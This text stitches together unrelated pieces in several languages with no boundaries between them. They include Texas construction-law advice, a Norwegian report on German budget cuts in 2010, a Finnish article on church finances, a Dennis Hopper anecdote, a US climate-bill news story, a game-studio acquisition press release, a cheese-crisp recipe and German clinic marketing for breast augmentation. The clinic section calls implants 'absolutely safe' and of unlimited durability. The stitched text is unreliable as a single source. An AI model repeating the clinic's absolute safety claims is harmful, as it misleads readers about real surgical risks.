Under a typical Consequential Damage Waiver , a property owner might waive the following categories of damages : ( 1 ) loss of rental expenses , ( 2 ) loss of use , ( 3 ) loss of income , and ( 4 ) loss of productivity .
Under the same provision , a contractor might typically waive the right to recover : ( 1 ) increased principal office overhead , ( 2 ) loss of financing , business , and reputation , and ( 3 ) loss profits .
Design Defects and Defective Work
Defective work can arise from an architect or engineer ’s improper design and / or a contractor ’s failure to follow the plans and specifications .
Architects and engineers are held to a high standard of care and are responsible for their design defects .
Contractors are expected to perform their work in a workmanlike manner and failure to do generally results in a breach of contract .
Sometimes the defects are discovered during the progress of the work and other times several years after the work has been completed .
In either case , the first steps to enforcing a claim for defective designs and / or work are typically : ( 1 ) review of the contract for your rights and obligations ; ( 2 ) retain a third - party architect , engineer , or contractor to inspect the work and determine the nature of the defects ; and ( 3 ) obtain an estimate to correct the defective work .
In order to assert a claim against an architect or engineer for breach of professional services , you must first retain a third - party professional who holds the same or similar license to state under oath that the architect or engineer ’s work fell below the standard of care .
This is known as a Certificate of Merit and is only required when bringing a claim against an architect , engineer , or land surveyor .
You must also keep in mind that a claim against an architect , engineer , or contractor must be brought within the applicable statute of limitations .
In Texas , most claims for construction related defects have a 2 - 4 year statute of limitations that begins to accrue when the property owner discovered or could have reasonably discovered the defect .
Failure to Pay and Right to Withhold Payment
Property owners and contractors have an obligation to timely pay their contractors , subcontractors , and material suppliers .
Under the Texas Prompt Payment
Act , property owners must pay their contractors within 35 days from receiving a payment application / invoice and contractors and subcontractors must pay their subcontractors and suppliers within 7 days of receiving payment for their work .
A failure to pay within the required deadlines constitutes a violation of the Prompt Payment Act and subjects the defaulting party to paying interest on the unpaid amount at 18 % a year and potential reimbursement of attorneys ’ fees and costs .
There is an exception to the Act which allows the property owner / contractor / subcontractor to withhold the amount claimed owed if there is a “ good faith ” dispute as to whether the money is in fact actually owed .
If the money is being withheld to correct defective work , not more than 100 % of the cost to correct the work can be withheld on commercial projects .
On commercial projects , it is not uncommon for the general contractor and its subcontractors to have either a “ paid - if - paid provision ” or a “ paid - when - paid provision ” in their contract .
Both provisions are intended to shift the risk of payment from the general contractor to the subcontractor ; however the difference between these two provisions is important .
Under a valid paid - if - paid provision , the general contractor is forever relieved from paying its subcontractor if it is not paid by the property owner .
Paid - if - paid provisions must be unambiguous to be enforceable , but there is no magic language required for a valid provision .
The key to an enforceable paid - if - paid provision is a clear and concise statement that the subcontractor is assuming the risk of non-payment in the event the contractor is not paid by the property owner .
However , a contractor may not be allowed to enforce a paid - if - paid provision if the reason for non-payment is entirely its fault and not the fault of the unpaid subcontractor .
Under a valid paid - when - paid provision , the general contractor must still pay its subcontractor even if it is not paid by the property owner , but will have a reasonable time after nonpayment to satisfy payment .
Most unenforceable paid - if - paid provisions are converted into a paid - when - paid provision .
As such , the first step to enforcing or defending against such a provision , is to have it analyzed by a construction lawyer .
Change Orders and Extra Work
So many disputes arise over change orders , or the lack thereof .
Most contracts contain a specific provision on how to process changes in the work ; however , they are rarely followed by either party .
A well drafted provision will require the parties to execute a change order that describes the change , the increase or decrease to the contract price , and whether the contractor will receive additional time .
Most provisions will also state that a failure to obtain a fully executed change order before the work is performed will result in a waiver of payment for the additional work .
One recognizable exception to the requirement of a written change order , is if the parties have knowingly waived the provision through their conduct , i.e. , where there is multiple changes performed throughout the course of the project without a written change order .
Under these circumstances , the contractor might argue that the parties waived the provision or that the verbal requests were separate verbal agreements apart from the contract .

GJELDSKRISEN I EUROPA : Tyskland skal kutte 80 milliarder
Tyskland viser vei for de andre EU - landene .
STRAMMER INN : Tysklands rikskansler Angela Merkel .
Vis mer byoutline THOMAS PETER
Publisert : Oppdatert : 24 . mai 2010 14:41 , Publisert : 24 . mai 2010 10:39
De tyske myndighetene planlegger drastiske kutt for å redusere budsjettunderskuddet .
Det skriver Financial Times ( FT ) .
5 % i minus
Kuttene er ventet å beløpe seg til 10 milliarder euro - eller drøyt 80 milliarder kroner - i året frem til 2016 , sier anonyme regjeringskilder til FT .
Tyskland som er blant de flinkeste deltagerne i eurosonen , styrer mot et større budsjettunderskudd i 2010 enn det reglene i utgangspunktet tilsier .
Tyskland ligger an til et budsjettunderskudd på 5 prosent av brutto nasjonalprodukt ( BNP ) i 2010 , mens 3 prosent er maksgrensen for landene som er med i eurosamarbeidet .
Det skal dog sies at Tyskland kommer svært godt ut av en sammenligning med landene rundt Middelhavet der budsjettunderskuddet drar seg opp mot 10 prosent av BNP .
Gjeldsregler i grunnloven
Den tyske regjeringen innførte i grunnloven tidligere i år sine egne svært strenge gjeldsregler .
Disse reglene , som har fått kallenavnet gjeldsgiljotinen , legger langt større begrensninger på budsjettunderskudd enn reglene for euro - sonen .
Målet med de kommende kuttene er å komme seg til et underskudd på 3 prosent innen 2013 , men ambisjonene er større på sikt .
Innen 2016 skal Tyskland ha klart å komme innenfor sine egen regler som maksimalt tillater et budsjettunderskudd på 0,35 prosent av BNP .
Økt skatt
Både skatteøkninger og lavere offentlig forbruk er forventede resultater av den tyske innstrammingspakken , til tross for at regjeringskoalisjonen ledet av rikskansler Angela Merkel tidligere har uttalt at skattekutt var et mål .
Finansminister Wolfgang Schaüble sa i et intervju søndag at reformer knyttet til arbeidsledighetstrygd og andre trygdeordninger kan være en de lav innstrammingene hvis de ble gjort på en slik måte at de fikk flere tilbake i jobb .
Europas vekstmotor
Financial
Times skriver at til tross for at kuttene på 10 milliarder euro er i tråd med det Merkel tidligere har signalisert , så vil de tyske planene bli møtt med motstand hos andre euro - land .
Den enorme krisepakken på 750 milliarder euro som EU og Det internasjonale pengefondet ( IMF ) kom til enighet om for to uker siden , krever kraftige kutt for de landene som blir nødt til å benytte seg av den .
Disse kuttene vil imidlertid bremse den økonomiske veksten i Europa , og mange har håpet at Tyskland , som ikke vil ha behov for denne krisehjelpen , vil begrense sine kutt for å opprettholde veksten i eurosonen på kort sikt .
Torsdag kommer USAs finansminister Timothy Geithner til Tyskland for å møte Schäuble .
Det er ventet at Geithner blant annet vil legge press på Tyskland til å opprettholde den innenlandske etterspørselen slik at veksten i Europa ikke helt stopper opp .
Hvorvidt det ønsket fører frem hos disiplinerte tyskere er svært usikkert .
Lieutenant Colonel James Carr - Smith , from Task Force Helmand , said : " It is with deep sorrow I must inform you that two soldiers from 1st Battalion The Mercian Regiment , part of 1st Battalion The Royal Gurkha Rifles Battle Group , were killed by small arms fire yesterday afternoon in Nahr-e Saraj , Helmand .
Rahavaikeudet saattavat ajaa Suomen evankelis - luterilaisen kirkon taloudelliseen umpikujaan .
Sopeutuminen voimakkaasti muuttuneisiin olosuhteisiin ei ole onnistunut .
Kriisitietoisuus ei ole kovin vahvaa mikä osittain johtuu siitä , että kirkossa peitellään huonoja uutisia .
Asioiden todellisesta tilasta eivät ole tietoisia edes kaikki kirkon omat työntekijät .
Pahimmassa tapauksessa edessä voi olla uuden kirkon perustaminen .
Kirkko saattaa myös hajota useampaan osaan .
Suomen Yhdyspankin entinen pääjohtaja Ahti Hirvonen on ollut vahvasti mukana evankelis - luterilaisen kirkon toiminnassa ja kuuluu eräisiin kirkon tulevaisuutta pohtiviin epävirallisiin työryhmiin .
Hänen mukaansa kirkko saattaa ajautua tällä vuosikymmenellä vakavaan kriisiin .
Kirkkoa nimittäin piiritetään monelta suunnalta .
Jäsenmäärä on laskukierteessä – viime vuonna kirkosta erosi yli 41 000 ihmistä .
Myös kirkon yrityksiltä saama yhteisöveropotti supistui laman takia .
Muiden ongelmien takana kummittelee eläkevastuu , joka on kirkon oman eläkerahaston varassa .
Jos toiminta supistuu merkittävästi , kyky vastata eläkesitoumuksista on vaarassa .
Jos erilaisista velvoitteista ei selvitä , onko mahdollista , että kirkko ajautuu konkurssiin ?
Kirkko on julkisoikeudellinen yhteisö , jollaisen konkurssista ei ole säännöksiä tai ennakkotapauksia .
Mutta jonkinlainen selvitystila syntyy , jos sitoumuksia , kuten eläkkeitä ei pystytä hoitamaan .
Tilannetta mutkistaa se , että seurakunnat ovat itsenäisiä ja niiden taloudellinen asema on erilainen .
On perustettava uusi kirkko
Ahti Hirvosella on mielessään äärimmäinen vaihtoehto tilanteen korjaamiseksi .
Se perustuu hänen kokemuksiinsa yritysmaailmasta .
” On perustettava uusi kirkko , jos nykyistä kirkkoa ei pystytä uudistamaan .
Se ottaisi toiminnan hoitaakseen ja tarjoaisi jäsenyyttä nykyisen kirkon jäsenille .
Rakenne tehtäisiin sellaiseksi , että se motivoisi ihmisiä kuulumaan kirkkoon ja tekemään vapaaehtoistyötä .
Työntekijöitä palkattaisiin vain sen verran kuin uusissa olosuhteissa olisi tarpeellista ” , Hirvonen arvioi .
” Nykyisestä kirkosta muodostuisi omaisuudenhoitoyhteisö , jolle jäisi kirkon omaisuus ja muun muassa vanhat eläkevastuut .
Uudet vastuut alkaisivat kertyä uuteen kirkkoon .
Se voisi myös vuokrata kirkkorakennuksia ja muita tiloja , mistä kertyisi tuloja vanhaan kirkkoon .
Aika paljon omaisuutta pystyttäisiin myös realisoimaan . ”
” Uuteen kirkkoon ei kuitenkaan saataisi läheskään kaikkia nykyisiä jäseniä .
Saattaisi myös syntyä useampia luterilaisia kirkkoja , joilla olisi erilaisia painotuksia ” , hän sanoo .
Vaikeasta tilanteesta huolimatta ensin pitäisi kuitenkin yrittää panostaa nykyisen kirkon kehittämiseen .
Päätöksentekoa pitää uudistaa .
Jo nyt kirkon piirissä on kutakuinkin selvää mitä pitäisi tehdä esimerkiksi kirkkoa koskevan lainsäädännön ja johtamisjärjestelmän uudistamiseksi .
Riski syntyy siitä , että asioiden käsittely kirkolliskokouksessa on hidasta eikä uudistuksia usein hyväksytä .
Alle 30 kirkolliskokousedustajaa pystyy kaatamaan taloutta ja hallintoa koskevat ehdotukset .
Tällainen vähemmistö löytyy usein pienten seurakuntien voimalla .
Ne pystyvät kaatamaan hankkeita , jotka olisivat välttämättömiä suurille seurakunnille .
Hirvosen mukaan syksyn kirkollisvaaleissa onkin paljon pelissä .
Valituiksi olisi tärkeää saada ihmisiä , jotka ymmärtävät kirkon nykyisen ahdingon ja sen , että kirkolliskokousedustajat ovat vastuussa kirkon kokonaisuudesta .
” Jos kirkon etuja ajetaan vain paikallisesti , kokonaisuus voi hajota . ”

In 1983 I filmed & edited this blown out video ( below ) shot on Beta movie ( not Betacam SP ) of Dennis Hopper during his visit to the the Media Center at Rice .
The dynamite coffin stunt could not be performed at Rice for saftey / insurance reasons , so Hopper hired a fleet of school buses to transport the audience to a race track north of town off Hopper road .
Hopper brought in a Hollywood stuntman to design the event & all went as planned .
The video clearly shows how out of control our hero was at this time who was being supplied with a steady diet of exotic substances .
My memories of Hopper during his visit include a sad telephone conversation with Jack Nicholson ’s secretary where Hopper was trying unsuccessfully to speak with Jack the “ star ” who was in Houston making Terms of Endearment .
Rather than a cutting edge figure , Hopper constantly reflected back to the Hollywood of the fifties telling great yarns about the “ titans ” of the film industry including Henry Hathaway , John Wayne and of course his great mentor , James Dean .
What Hopper liked about this mixed bag of characters was that they did what they wanted & to hell with everyone else .
He seems to have modeled his life on this simple value .
Hopper vanished into Mexico following his Houston experience & the last I heard he was seen running naked through some city street .
Too tough to be destroyed by such self abuse , Hopper later appeared on the cover of Vanity Fair , recovered , regenerated & ready …!
p.s. I forgot to mention that the large guy making the sign of the cross is the writer Terry Southern and the jerk threatening to blow up my camera is the German filmmaker , Wim Wenders .

Sens .
John Kerry and Joe Lieberman said on Tuesday that President Obama insists on pricing greenhouse gases , but could also agree to a more limited climate and energy bill than what they previously drafted .
Dems offer to scale back climate bill
Key Senate Democrats offered , during a White House meeting with President Barack Obama and skeptical Republicans on Tuesday , to scale back their ambitious plans to cap greenhouse gases across multiple sectors of the economy .
Sens .
John Kerry and Joe Lieberman told reporters after the 90 - minute West Wing meeting that Obama held firm in his calls for a price on greenhouse gases .
But they said the president acknowledged that he could agree to a more limited climate and energy bill than any the senators had previously drafted .

“ We believe we have compromised significantly , and we ’re prepared to compromise further , ” Kerry said .
" The president was very clear about putting a price on carbon " and curbing greenhouse gases , he added .
Lieberman said a couple of Republicans in the meeting promised to keep talking about the prospect of a less - ambitious climate program that includes a price on carbon , though he would n't name names .
Kerry and Lieberman released a climate bill last month that capped greenhouse gases emitted by power plants , transportation and trade - sensitive manufacturers .
Reaction to their bill has been lukewarm , and the duo said they would keep talking to senators on both sides of the aisle during the coming weeks to try to find a deal that could win 60 Senate votes .
Asked whether a power plant - specific bill was in the cards , Kerry replied , “ There are any number of varieties .
That could be one of them . "
Energy and Natural Resources Committee Chairman Jeff Bingaman confirmed on Monday that he 's drafting legislation to cap greenhouse gases just from power plants .
Republican Sens. Lamar Alexander , Susan Collins , Judd Gregg , Richard Lugar , Lisa Murkowski , Olympia Snowe and George Voinovich also attended the White House meeting , but left with a very different message than their Democratic counterparts .
“ We ’ve got to take a national energy tax off the table in the middle of a recession , ” said Alexander , chairman of the Senate GOP Conference .
Gregg , who previously has backed emission limits just on power plants , urged Democratic leaders to focus solely on an energy bill that includes incentives for renewables , but no price on carbon emissions .
" Our goal should be reducing our dependence on oil from people do n't like us , ” he said .
Obama ’s meeting with the senators , including Majority Leader Harry Reid , ran overtime .
It was originally scheduled to last less than an hour .
The White House press office also abruptly canceled a brief pool spray during which TV cameras and reporters were to be shuttled in for remarks by the president .
White House officials said the cancellation was because of " scheduling considerations . "
A White House statement released after the meeting acknowledged tensions in the room .
" The president told the senators that he still believes the best way for us to transition to a clean energy economy is with a bill that makes clean energy the profitable kind of energy for America ’s businesses by putting a price on pollution – because when companies pollute , they should be responsible for the costs to the environment and their contribution to climate change .
Not all of the senators agreed with this approach , and the president welcomed other approaches and ideas that would take real steps to reduce our dependence on oil , create jobs , strengthen our national security and reduce the pollution in our atmosphere . "
Obama indicated he saw " a strong foundation and consensus on some key policies .
" There was agreement on the sense of urgency required to move forward with legislation and the president is confident that we will be able to get something done this year , " the White House added .

In a surprising move the browser game giant Bigpoint ( Bigpoint.com game portal ) announced the acquisition of the insolvent Drakensang developer Radon Labs .
Here 's the full PR ( bold print acc. to source , underlines added ) .
Bigpoint Acquires Highly Acclaimed Game Development Studio , Radon Labs ; Establishes Bigpoint Berlin GmbH
Acquisition includes over 35 employees from Radon Labs
eLOFD GmbH to be renamed Bigpoint Berlin GmbH ; expansion planned
Drakensang 3 presumably to be launched in 2011 Hamburg , 1st June , 2010 – Bigpoint GmbH ( http://bigpoint.com), the worldwide leader in browser - based video games , today announced the acquisition of Radon Labs ( http://radonlabs.de), an award - winning game development studio that recently filed for bankruptcy due to financial concerns .
With this acquisition , Bigpoint gains more than 35 new employees , including Radon Labs Managing Directors Bernd Beyreuther and André Blechschmidt , who will remain with Bigpoint and direct its newly established Berlin office .
Bigpoint CEO and Founder , Heiko Hubertz , views the deal as an important strategic move for the company , “ Under Bernd and André ’s leadership , Radon Labs became one of Germany ’s top three development studios .
We ’re excited to add their highly qualified workforce to Bigpoint as we continue to push the limits of what ’s possible in online gaming .
This acquisition is also greater proof that the market continues to consolidate .
As such , we plan to purchase additional studios , both in Germany and abroad , to support our long - term growth strategy . ”
2010 marks an important year for Bigpoint ’s global expansion , with new locations now operational in Berlin and San Francisco ( Bigpoint Inc. ) , in addition to Malta ( Bigpoint International ) and the company ’s headquarters in Hamburg .
In recent months , Bigpoint ’s workforce has increased to over 500 employees worldwide .
Bigpoint Berlin GmbH Opens
Since its founding in 1995 , Radon Labs became known as one of the best game development studios in Germany , developing more than 20 PC , Xbox 360 , PS3 , Wii , and NDS titles that garnered over a dozen awards .
The Berlin - based company ’s most popular games are its first two Drakensang titles .
In keeping with Bigpoint ’s focus , Drankensang 3 – the next installment from the extremely successful fantasy RPG series – will be released in 2011 .
Bigpoint ’s acquisition of Radon Labs coincides with the opening of a new office in Berlin , a decision that first took root in 2009 with Bigpoint ’s acquisition of eLOFD GmbH , a game development studio also based in Germany ’s capital .
The new location officially took the name Bigpoint Berlin GmbH at the end of May 2010 .
Under the Bigpoint brand , former eLOFD employees will continue to develop browser - based video games alongside their new colleagues from Radon Labs .
The real surprise is the Drakensang 3 announcement .
It 's unclear as of now if Bigpoint really intents to branch out into the full price retail game business .
Another possibility would be that it could only be an adequate farewell for Radon Labs and their The Dark Eye project negotiated into the acquisition contract .
Time will tell .
What 's clear though is that Bigpoint has enough money behind to stem Drakensang 3 alone , including international distribution .
Maybe Bigpoint even is even planning a DSA browser MMO , but that 's pure speculation .
Note :
This recipe was originally posted in April , 2010 .
We still make these and they ’re still just as delicious .
You wo n’t regret giving this recipe a try !
I ’ve probably made these cheese crisps 100 times already .
They ’re so delicious , easy to “ customize , ” and quick to make .
They ’re great to snack on when you ’re in the mood to “ munch ” but carrot sticks just are n’t cutting it – these are full of protein and fat and ( depending on your cheese ) zero to few carbs .
They ’ll satisfy actual hunger , which is always a plus , you know , for FOOD .
So , start with your cheese .
You can use cheddar , parmesan , Monterey jack , whatever you ’d like .
I have n’t tried it with mozzarella or provolone yet so I ’m not sure how those would turn out , but if you ’re in the mood for that , why not give it a try ?
What ’s the worst that could happen ?
If you ’re planning on mixing in seasonings or spices , grate your cheese .
Or get pre-shredded cheese .
Either is fine .
I ’ve used the “ mexican shredded blend ” before with success .
Otherwise , if you ’re doing just plain cheese , you just need to slice it .
Preheat your oven to 350 degrees Fahrenheit and put some parchment paper on a cookie sheet .
Did you hear me about the parchment ?
It must be parchment .
Foil wo n’t work ( trust me , I ’ve tried ) , nor will “ cooking spray ” or any other method … parchment and parchment only .
Can I say it again ?
Parchment .
Now , if you ’re using shredded cheese + seasonings , go ahead and toss it all together in a bowl .
Cheddar / Jack and Ranch dressing mix is amazing .
“ Mexican blend ” is great with some chili powder and garlic .
Parmesan and basil is always nice .
Do what feels good to you .
Just do n’t add salt .
Remember , cheese is already PLENTY salty on its own .
You do NOT need additional salt .
For shredded cheese , put little lumps of it all over the parchment - lined cookie sheet , spaced out because they WILL “ grow ” and spread more than you think they will .
And when I say “ little ” lumps , I mean little … about a teaspoon of cheese each .
If you ’re using plain cheese , slice it thinly ( not paper - thin , but like “ sandwich slices ” thin ) and break or cut it into little squares .
About an inch square is good .
Again , they will spread out , so place these on the parchment - lined cookie sheet , spaced out like cookies .
Now put it on a rack centered in the middle of your oven , and bake for 5 - 7 minutes .
Then peek .
If the edges are starting to brown , you could try taking it out .
If you ’re not sure , leave it in for another minute or two .
I ’ve accidentally forgotten about these in the oven before , and the whole thing turned brown and it was STILL tasty … but if you do n’t let it bake enough , it ’ll just be stretchy melted cheese , not cheese “ crisps . ”
When you remove them from the oven , you ’ll need to let them cool .
If you have the sort of countertop that feels cold , you can just lift the whole piece of parchment off the cookie sheet , and set it on your counter for a few minutes .
Or if you do n’t , you can use a pancake - flipper thing ( what are they really called ?
not spatulas ; those are different ) to pick them up and put them on a cool plate .
After a few minutes , they ’ll be crisp !
And you have a great party snack .
Or a lunchbox “ side . ”
Or if you ’re like me , possibly dinner .
Want some more great low - carb or no-carb snacks ?

PARCHMENT .
Trust me .
Shred cheese and mix with seasonings or herbs ( Do NOT add salt .
Cheese is salty enough . )
OR
Cut cheese into thin slices .
( or get the cheese cut " for sandwiches " at the deli in your grocery store )
Either put little lumps of the shredded cheese ( maybe 1 Tbsp or so ) or squares of the sandwich slices ( about 1/ 4 or 1/6 of a full slice per cheese crisp ) onto the parchment , a couple of inches apart .
They will spread as they bake .
Bake 5 - 7 minutes or until beginning to brown around the edges .
Allow to cool , to finish getting crispy .
Eat !
They 're great plain or with your favorite dips .
Check out my really delicious artichoke dip .

Brustvergrößerung einige wichtige allgemeine Informationen zur OP
Die weibliche Brust besteht hauptsächlich aus Fett und Drüsengewebe und wird durch Bindegewebe gestützt .
Die Brüste befinden sich in einem steten Kampf gegen die Schwerkraft , wobei die Größe als auch das Gewicht der Brüste eine entscheidende Rolle spielen .
Form und Größe sind durch die Gene festgelegt und können dabei weder durch sportliches Training noch durch andere Methoden entscheidend verändert werden .
Für die Frau jeden Alters ist die Brust ein wichtiger Teil ihrer körperlichen Zufriedenheit .
Welche Größe und Form dabei die Ideale ist , sollte nicht von Ihrer Umwelt , Partner oder gar Zeitschriften bestimmt werden .

Wertvolle Tips und Tricks für die Zeit nach der Brustvergrösserung
Es geht einzig und allein um ihr eigenes körperliches und seelisches Wohlbefinden .
Um ein richtig gutes Resultat zu erzielen , wird genau besprochen und untersucht , was tatsächlich dem persönlichen Wunsch entspricht .
Nur so kann es zu einem optimalen , zufriedenstellenden Ergebnis kommen .
Hier finden Sie übrigens Informationen über Preise und Kosten der Brustvergrößerung .
Eine große Anzahl Frauen leiden tagtäglich an ihrer zu kleinen Brust .
Auch wenn ein kleiner Busen zu keinen körperlichen Problemen führt , so ist die seelische Belastung oft ausgesprochen groß .
Eine Brustvergrösserung mit modernen Implantaten wird das Körperbild und Wohlempfinden in den meisten Fällen sehr positiv verändern .
Dabei werden in unserer Klinik ausschließlich Markenimplantate ( Mentor , Eurosilicone etc. ) verwendet .
Einige Frauen haben genetisch ( verebt ) bedingt eine sehr kleine Brust , die dabei leider oft nicht harmonisch zum restlichen Körper passt .
Bei anderen Frauen wiederum haben sich die Brüste durch Schwangerschaft oder das darauffolgende Stillen aber auch durch Gewichtsveränderungen negativ verändert .
Hier finden Sie Bilder und Fotos von Brustvergrößerungen .
Das Brustgewebe wird zunehmend schlaffer , die Brust beginnt dabei unschön zu hängen .
Auch wenn ein kleiner Busen meist voll funktionstüchtig ist , wünschen sich viele Frauen etwas mehr an Oberweite .
Die Scheu vor einer operativen Brustvergrösserung OP ist trotzdem nicht gerade selten , denn die allerersten Silikonimplantate Anfang der Neunzigerjahre sind dazumals negativ ins Gerede gekommen .
Diese Implantatprobleme gibt es heutzutage nicht mehr .

Weitere Tips und Tricks für die Zeit nach der Brustvergrösserung
Die aktuelle , neueste Generation der Brustimplantate kann diese Zweifel aus dem Weg räumen , denn sie können ein Leben lang im Körper bleiben und ihr I nhalt kann auch nicht mehr in das umliegende Gewebe austreten .
Brustimplantate der neuesten Generation können als absolut sicher betrachtet werden .
Lebenslange Garantie der Hersteller sind dabei üblich .
Kleine Brüste lassen sich weder mit teuren Brustcremes , Massagen oder Gymnastik , sondern nur mithilfe der plastischen Chirurgie dauerhaft vergrößern .
Versuche , dies mit körpereigenem Gewebe zu tun , sind bis jetzt gescheitert .
Entweder führten sie wie bei der freien Fetttransplantation zu hässlichen Ölzysten oder zu auffälligen , schlecht heilenden Narben , wie bei der Brustvergrössserung durch körpereigenem Fettgewebe .
Wieviel darf eine günstige Brustvergrößerung kosten ?
Mit modernen Brustimplantaten ist es möglich eine natürliche , optisch ansprechende und vor allem auch gefühlsechte Brustvergrösserung OP vorzunehmen .
Hierfür steht eine große Anzahl an Brustimplantaten in den unterschiedlichsten Größen und Formen zur Verfügung .
Hier können Sie Ihr persönliches , kostenloses Angebot anfordern .

Diese bestehen aus einer festen Silikonhülle , die mit verschiedensten Inhaltsstoffen gefüllt sind .
Neben den mit einer Kochsalzlösung ( NaCl Lösung ) gefüllten Brustimplantaten haben sich besonders mit Silikongel gefüllte Kissen bewährt .
Seit Mitte des vorigen Jahrhunderts haben solche Brustimplantate Millionen von Frauen auf der ganzen
Welt geholfen Ihr Selbstwertgefühl und Seelenfrieden wieder zu erlangen .
Bevor die operative Brustvergrößerung durchgeführt wird , ist es eventuell ratsam eine Mammographie durchführen zu lassen , um sicherzustellen , dass die Brüste keine Vorschädigungen aufweisen .
In einem ausführlichen Beratungsgespräch mit dem plastischen Chirurgen ist anschließend zu klären , welche Größe und Form die neue Brust haben soll .
Primäres Ziel dabei ist es , dem Wunschbild möglichst nahe zu kommen .
Die optimale Größe hat sich auch nach dem vorhandenen Gewebe und der Hautdicke zu richten .
Was aber die neue Brustform betrifft , so ist dies eher eine reine Geschmacksfrage .
Bei wenig vorhandenem Brustgewebe können anatomisch geformte , tropfenförmige Implantate gewählt werden .
Falls eine möglichst unsichtbare Narbe gewünscht wird , so muss der plastische Chirurg den Schnitt im Brustwarzenhof anlegen .
In diesem Fall ist ein tropfenförmiges Implantat zumeist besser geeignet .
Nutzen sie die Möglichkeit eines kostenlosen Vorschaubildes .
Sicherheit wird durch modernste Implantate gegeben .
Deren Hüllen aus bis zu 7 Schichten bestehen und zu deren Füllung ein quer vernetztes Silikongel mit einem Memoryeffekt verwendet wird .
Diese technisch ausgereiften Implantate haben eine unbegrenzte Haltbarkeit .
Trotzdem sollte nach 12 bis 15 Jahren in regelmäßigen Abständen kontrolliert werden um Unregelmäßigkeiten frühzeitig erkennen zu können .
Hier können Sie Ihr persönliches , kostenloses Angebot anfordern .
Brustvergrößerung Erfahrungen
Qualitätsimplatate sind teuer aber dafür sehr sicher .
Siehe PIP Skandal , Billigstimplantate die sogar in Verdacht stehen Krebserkrankungen auszulösen und gerne von Billiganbietern in Osteuropa verwendet wurden .
Die Silikonkissen werden in einem natürlichen Raum unter die Brustdrüse oder auch unter den Brustmuskel eingelegt .
Sie liegen dabei immer hinter der Brustdrüse , die damit absolut stillfähig bleibt .
Ein Kinderwunsch bleibt also absolut durchführbar .
Sie ist auch weiterhin der Vorsorgeuntersuchung durch Mammographie oder Ultraschall zugänglich .
Aktuelle internationale Statistiken zeigen : Das Krebsrisiko wird durch eine operative Brustvergrößerung nicht erhöht .
Über das postoperative Risiko , die Verhärtung der Brust ( die Kapselbildung ) , werden Sie nachfolgend noch mehr erfahren .
Ein paar Punkte bei der Brustvergrösserungoperation gibt es doch zu beachten :
Auf schwere körperliche Arbeit ( heben , tragen ) sollte die ersten Wochen nach der OP unbedingt verzichtet werden .
Die weiblichen Brüste wiegen im Normalfall zwischen 200 und 400 Gramm .
Ein Implantat sollte dieses Gewicht eher nur in Ausnahmefällen überschreiten .
Nach der Brustoperation bleiben eventuell sichtbare Narben zurück .
Diese verblassen mit der Zeit und sind je nach Veranlagung mehr oder weniger gut sichtbar sind .
Sehr selten führt das Implantat zu körperlichen Abstoßungsreaktionen .
Relativ selten ist auch eine Einkapselung der Implantate in das umliegenden Brustgewebe .
Dabei treten Spannungen auf und das Implantat wird vielleicht etwas verschoben .
Deshalb kann eine operative Korrektur unter Umständen notwendig sein .
Schmerzen , Knoten oder Unebenheiten der Brüste können auf einen Implantatdefekt hinweisen .
Bemerken Sie diese Symptome , so sollten Sie sofort Ihren behandelnden Arzt informieren .
Es kann ein Austausch oder die operative Entfernung des Brustimplantates und ein rasches Handeln erforderlich werden .
Hier können Sie Ihr persönliches , kostenloses Angebot anfordern .

Das nachfolgende Aussehen der Narben hängt nicht allein von der Operation ab , sondern im besonderen von Ihrem eigenen Verhalten und der Nachbehandlung .
Unnötige , schnelle Bewegungen , die Zug und Spannung auf die Brust ausüben , sollten in der ersten Zeit unbedingt vermieden werden , da sie die Narbenbildung äußerst ungünstig beeinflussen .
Auch intensive Sonnenbestrahlung der Brüste für das erste halbe Jahr sollten nach Möglichkeit
strikt vermieden werden .
Man sollte vor jedem schönheitschirurgischem Eingriff bei guter allgemeiner Gesundheit sein .
Im Rahmen des Beratungsgespräches wird Sie der plastische Chirurg zusätzlich darüber informieren , ob oder welche Medikamente vor der Brustvergrößerung nicht mehr eingenommen werden dürfen .
Auch ist es ratsam , sich nach der erfolgten Brustvergrößerung einige Tage frei zu nehmen , da Ruhe und Entspannung nach der Operation der Wundheilung sicher zuträglich ist und den Heilungsverlauf positiv beeinflussen .
Ist eine operative Brustvergrösserung das geeignetste Mittel der Wahl für mich ?
Wenn eine oder mehrere dieser Punkte auf Sie zutreffen , so wird Ihnen eine Brustvergrösserung OP sicher weiterhelfen .
1. ) Kleidungsstücke , die im Bereich der Hüften gut passen , sind im Brustbereich eher zu groß .
2. ) Sie fühlen sich in öffentlichen Bädern ( Sauna ) nicht wohl .
3. ) Ein Gewichtsverlust hat die Größe und Form Ihrer Brüste nachhaltig verändert .
4. ) Es stört Sie schon viele , viele Jahre , dass Ihre Brust zu klein ist .
5. ) Eine Brust ist deutlich kleiner als die andere Brust ( insbesonders nach Geburten ) .
6 . ) Sie möchten sich selbst Ihren Partner nicht nackt zeigen .

Den Zigarettenkonsum sollten
Sie vor der Brustvergrößerung unbedingt deutlich einschränken .
Aspirin und bestimmte andere Schmerzmittel verändern die Blutgerinnung negativ und sollten eine Woche vor der Operation vermieden werden .
Bitte informieren
Sie uns unbedingt von der Einnahme von Medikamenten .
Dies trägt wesentlich zur Sicherheit bei .
Endlich - der Tag der Operation
Die Brustvergrößerung OP wird in unserer Schönheitsklinik durchgeführt , übrigens die modernste in Europa .
Optimalerweise sollte die Brustvergrößerung in Vollnarkose durchgeführt werden , jedoch ist diese OP in Ausnahmefällen auch im sogenannten Dämmerschlaf möglich .
Kurz nach der Operation werden
Sie für einige Stunden in den Aufwachraum gebracht , um eine kontinuierliche medizinische Überwachung zu gewährleisten .
Sie erhalten einen Brustverband , der nach einigen Tagen ambulant gewechselt wird .
Eine Nacht sollten
Sie mindestens zur Beobachtung in unserer Obhut verbringen .
Die ersten
Tage nach der Brustvergrösserung
Der Brustverband wird innerhalb von wenigen Tagen entfernt .
Danach sollten Sie einen Sport - BH für mindestens 6 Wochen Tag und Nacht tragen .
Duschen ist nach wenigen Tagen wieder möglich .
Die notwendigen Hautnähte werden sich bald von selbst auflösen .
Blaue Flecken ( Hämatome ) und Schwellungen können in den ersten Tagen vorhanden sein , werden aber rasch wieder verschwinden .
Brustvergrößerung - der Alltag !
Nach einer erfolgreichen Brustvergrösserung ist es normalerweise möglich , innerhalb von wenigen Tagen zur gewohnten Arbeit zurückzukehren .
Anstrengende Aktivitäten ( das Heben oder Tragen schwerer Gegenstände ) , sollten für die ersten 4 Wochen unterbleiben .
Auch Sex sollte innerhalb der ersten
Woche eher vermieden werden .
Die Gefahr einer Wundheilungsstörung wäre zu hoch und somit das Operationsergebnis gefährdet .

